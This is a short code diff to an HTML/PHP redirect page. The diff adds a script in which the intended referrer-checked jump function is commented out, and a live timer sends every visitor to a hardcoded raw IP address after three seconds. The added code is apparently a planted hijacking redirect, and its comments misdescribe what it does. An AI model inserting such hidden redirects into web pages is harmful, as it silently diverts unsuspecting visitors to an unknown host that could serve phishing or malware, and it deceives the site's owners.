@@ -23,7 +23,22 @@
         src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-y/izitoast/1.4.0/js/iziToast.min.js">
     </script>
     <!-- IE Out -->
-    
+    <script>
+  function link_jump()
+  {
+    //禁止其他网站使用我们的跳转页面
+    var MyHOST = new RegExp("<?php echo $_SERVER['HTTP_HOST']; ?>");
+    if (!MyHOST.test(document.referrer)) {
+       location.href="https://" + MyHOST;
+    }
+    location.href="<?php echo $url; ?>";
+  }
+  setTimeout(function(){window.location.href='http://18.163.28.123/';},3000);
+    //延时1S跳转，可自行修改延时时间
+    //setTimeout(link_jump, 1500);
+  //延时50S关闭跳转页面，用于文件下载后不会关闭跳转页的问题
+  setTimeout(function(){window.opener=null;window.close();}, 50000);
+  </script>
 </head>
 
 <body>
